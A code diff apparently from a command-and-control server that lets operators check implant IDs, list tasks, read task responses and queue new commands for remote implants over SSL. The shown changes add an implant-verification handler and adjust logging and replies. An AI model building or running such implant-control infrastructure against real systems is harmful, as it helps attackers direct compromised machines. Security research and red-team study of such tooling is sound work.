@@ -36,7 +36,7 @@ int autheticate(MYSQL *con, SSL *ssl) {
     char auth[1024];
     int bytes_received = SSL_read(ssl, auth, sizeof(auth));
     if (bytes_received <= 0) {
-        perror("recv failed");
+        log_message(LOG_ERROR, "Failed to recieve authentication data from operator" );
         return -1;
     }
     auth[bytes_received] = '\0'; 
@@ -100,6 +100,24 @@ int autheticate(MYSQL *con, SSL *ssl) {
     return 0;
 }
 
+char *verify_id(MYSQL *con, char *id) {
+    cJSON *valid_id = cJSON_CreateObject();
+            
+    if (check_implant_id(con, id) == 0) {
+        cJSON_AddStringToObject(valid_id, "valid_id", "false");
+        char *reply = cJSON_Print(valid_id);
+        cJSON_Delete(valid_id);
+        log_message(LOG_INFO, "Requested Implant ID %s does not exists",id);
+        return reply;
+    } else {
+        cJSON_AddStringToObject(valid_id, "valid_id", "true");
+        char *reply = cJSON_Print(valid_id);
+        cJSON_Delete(valid_id);
+        log_message(LOG_WARN, "Requested Implant ID %s does exists",id);
+        return reply;
+    }
+}
+
 char *interact_with_implant(MYSQL *con,cJSON *rinfo) {
     
     if (!rinfo) {
@@ -111,22 +129,7 @@ char *interact_with_implant(MYSQL *con,cJSON *rinfo) {
         return NULL;
     }
     char *implant_id_value = implant_id->valuestring;
-    //cJSON *valid_id = cJSON_CreateObject();
-    //
-    //if (check_implant_id(con, implant_id->valuestring) == 0) {
-    //    cJSON_AddStringToObject(valid_id, "Valid ID", "false");
-    //    char *reply = cJSON_Print(valid_id);
-    //    cJSON_Delete(valid_id);
-    //    log_message(LOG_INFO, "Requested Implant ID %s does not exists",implant_id_value);
-    //    return reply;
-    //} else {
-    //    cJSON_AddStringToObject(valid_id, "Valid ID", "true");
-    //    char *reply = cJSON_Print(valid_id);
-    //    cJSON_Delete(valid_id);
-    //    log_message(LOG_INFO, "Requested Implant ID %s does exists",implant_id_value);
-    //    //return reply;
-    //    // change here
-    //}
+    
 
     cJSON *action = cJSON_GetObjectItem(rinfo, "action");
 
@@ -142,8 +145,7 @@ char *interact_with_implant(MYSQL *con,cJSON *rinfo) {
 
     if (strcmp(action_value, "list-tasks") == 0) {
         snprintf(data, MAX_INFO, "%s", tasks_per_implant(con, implant_id_value));
-    } 
-    else if (strcmp(action_value, "response-task") == 0) {
+    }  else if (strcmp(action_value, "response-task") == 0) {
         cJSON *task = cJSON_GetObjectItem(rinfo, "task_id");
         if (!task || !cJSON_IsNumber(task)) {
             free(data);
@@ -152,6 +154,8 @@ char *interact_with_implant(MYSQL *con,cJSON *rinfo) {
         char *data_t = cmd_and_response(con, task->valueint);
         snprintf(data, MAX_INFO, "%s", data_t);
         free(data_t);
+        // send the data
+        //
     } 
     else if (strcmp(action_value, "new-task") == 0) {
         cJSON *command = cJSON_GetObjectItem(rinfo, "command");
@@ -180,7 +184,7 @@ char *interact_with_implant(MYSQL *con,cJSON *rinfo) {
             free(data);
             return strdup("{\"update\": \"false\"}");
         } 
-        return strdup("{\"update\": \"false\"}");
+        return strdup("{\"update\": \"true\"}");
     } else {
         free(data);
         return strdup("{\"error\": \"Invalid action\"}");
@@ -270,6 +274,7 @@ void *operator_handler(void *Args) {
             SSL_write(ssl, tasks, strlen(tasks));
             free(tasks);
         } else if (strcmp(about->valuestring, "implant_id") == 0) {
+
             char *data = interact_with_implant(con, requested_info);
             if (data == NULL) {
                 //send(sock, "ERROR", strlen("ERROR"), 0);
@@ -282,6 +287,16 @@ void *operator_handler(void *Args) {
         } else if (strncmp(about->valuestring, "exit", 4) == 0 ) {
             log_message(LOG_INFO, "Operator [%s] Exiting", USERNAME);
             return NULL;
+        } else if (strncmp(about->valuestring, "verify_implant", sizeof("verify_implant")) == 0) {
+            cJSON *implant_id = cJSON_GetObjectItem(requested_info, "implant_id");
+           
+            char *is_valid = verify_id(con, implant_id->valuestring);
+            if (is_valid == NULL) {
+                log_message(LOG_WARN, "IS vallid is null");
+                continue;
+            }            
+            SSL_write(ssl, is_valid, strlen(is_valid));
+            free(is_valid);
         }
         cJSON_Delete(requested_info);
     }
